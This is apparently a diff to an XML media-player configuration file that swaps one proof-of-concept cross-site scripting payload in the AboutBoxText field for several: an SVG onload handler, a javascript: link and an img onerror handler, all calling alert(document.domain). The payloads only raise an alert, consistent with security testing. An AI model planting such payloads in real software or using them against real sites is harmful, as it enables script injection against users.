@@ -12,7 +12,7 @@
 <ControllerColor>C0C0C0</ControllerColor>
 <ShowFFRW>1</ShowFFRW>
 <ShowAbout>1</ShowAbout>
-<AboutBoxText><![CDATA[<svg onload='alert(document.domain)'>]]></AboutBoxText>
+<AboutBoxText><![CDATA[<svg onload='javascript:alert(document.domain)'></svg><a href='javascript:alert(document.domain)'> CLICK HERE</a> <img src='x' onerror='javascritp:alert(document.domain)'> </img>]]></AboutBoxText>
 <TimeDisplayFormat>MM:SS</TimeDisplayFormat>
 <ShowDuration>1</ShowDuration>
 <ShowElapsedTime>1</ShowElapsedTime>
